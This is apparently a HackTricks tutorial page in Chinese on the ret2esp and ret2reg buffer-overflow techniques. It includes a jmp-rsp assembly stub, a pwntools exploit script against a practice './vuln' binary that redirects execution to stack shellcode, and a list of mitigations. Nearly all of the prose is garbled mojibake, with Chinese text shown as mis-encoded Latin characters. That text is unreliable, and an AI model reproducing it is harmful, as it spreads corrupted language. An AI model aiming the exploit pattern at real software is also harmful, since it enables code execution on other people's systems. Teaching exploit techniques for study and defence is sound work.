# Ret2esp / Ret2reg

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **Ret2esp**

**å› ä¸º ESPï¼ˆæ ˆæŒ‡é’ˆï¼‰å§‹ç»ˆæŒ‡å‘æ ˆçš„é¡¶éƒ¨**ï¼Œè¯¥æŠ€æœ¯æ¶‰åŠç”¨ **`jmp esp`** æˆ– **`call esp`** æŒ‡ä»¤çš„åœ°å€æ›¿æ¢ EIPï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰ã€‚é€šè¿‡è¿™æ ·åšï¼Œshellcode è¢«æ”¾ç½®åœ¨è¢«è¦†ç›–çš„ EIP ä¹‹åã€‚å½“ `ret` æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒESP æŒ‡å‘ä¸‹ä¸€ä¸ªåœ°å€ï¼Œæ­£å¥½æ˜¯å­˜å‚¨ shellcode çš„åœ°æ–¹ã€‚

å¦‚æœ Windows æˆ– Linux ä¸­æœªå¯ç”¨ **åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰**ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åœ¨å…±äº«åº“ä¸­æ‰¾åˆ°çš„ `jmp esp` æˆ– `call esp` æŒ‡ä»¤ã€‚ç„¶è€Œï¼Œå½“ [**ASLR**](../common-binary-protections-and-bypasses/aslr/) æ¿€æ´»æ—¶ï¼Œå¯èƒ½éœ€è¦åœ¨æ˜“å—æ”»å‡»çš„ç¨‹åºå†…éƒ¨æŸ¥æ‰¾è¿™äº›æŒ‡ä»¤ï¼ˆå¹¶ä¸”å¯èƒ½éœ€è¦å‡»è´¥ [**PIE**](../common-binary-protections-and-bypasses/pie/)ï¼‰ã€‚

æ­¤å¤–ï¼Œèƒ½å¤Ÿå°† shellcode **æ”¾ç½®åœ¨ EIP æŸåä¹‹å**ï¼Œè€Œä¸æ˜¯åœ¨æ ˆçš„ä¸­é—´ï¼Œç¡®ä¿åœ¨å‡½æ•°æ“ä½œæœŸé—´æ‰§è¡Œçš„ä»»ä½• `push` æˆ– `pop` æŒ‡ä»¤ä¸ä¼šå¹²æ‰° shellcodeã€‚å¦‚æœ shellcode è¢«æ”¾ç½®åœ¨å‡½æ•°æ ˆçš„ä¸­é—´ï¼Œå¯èƒ½ä¼šå‘ç”Ÿè¿™ç§å¹²æ‰°ã€‚

### ç©ºé—´ä¸è¶³

å¦‚æœåœ¨è¦†ç›– RIP åç¼ºå°‘å†™å…¥ç©ºé—´ï¼ˆå¯èƒ½åªæœ‰å‡ ä¸ªå­—èŠ‚ï¼‰ï¼Œå¯ä»¥å†™ä¸€ä¸ªåˆå§‹çš„ `jmp` shellcodeï¼Œå¦‚ï¼š
```armasm
sub rsp, 0x30
jmp rsp
```
å¹¶åœ¨æ ˆä¸­æ—©æœŸå†™å…¥ shellcodeã€‚

### ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨ [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) ä¸­æ‰¾åˆ°æ­¤æŠ€æœ¯çš„ç¤ºä¾‹ï¼Œæœ€ç»ˆåˆ©ç”¨å¦‚ä¸‹ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

ç±»ä¼¼åœ°ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå‡½æ•°è¿”å›å­˜å‚¨ shellcode çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ **`call eax`** æˆ– **`jmp eax`** æŒ‡ä»¤ï¼ˆç§°ä¸º **ret2eax** æŠ€æœ¯ï¼‰ï¼Œæä¾›å¦ä¸€ç§æ‰§è¡Œæˆ‘ä»¬çš„ shellcode çš„æ–¹æ³•ã€‚å°±åƒ eax ä¸€æ ·ï¼Œ**ä»»ä½•å…¶ä»–å¯„å­˜å™¨** ä¸­åŒ…å«æœ‰è¶£åœ°å€çš„å¯„å­˜å™¨éƒ½å¯ä»¥è¢«ä½¿ç”¨ï¼ˆ**ret2reg**ï¼‰ã€‚

### ç¤ºä¾‹

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹ï¼š[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## ä¿æŠ¤æªæ–½

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md)ï¼šå¦‚æœæ ˆä¸å¯æ‰§è¡Œï¼Œè¿™å°†æ— æµäºäº‹ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦å°† shellcode æ”¾åœ¨æ ˆä¸­å¹¶è·³è½¬ä»¥æ‰§è¡Œå®ƒã€‚
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) å’Œ [**PIE**](../common-binary-protections-and-bypasses/pie/)ï¼šè¿™äº›å¯èƒ½ä½¿æ‰¾åˆ°è·³è½¬åˆ° esp æˆ–ä»»ä½•å…¶ä»–å¯„å­˜å™¨çš„æŒ‡ä»¤å˜å¾—æ›´åŠ å›°éš¾ã€‚

## å‚è€ƒèµ„æ–™

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
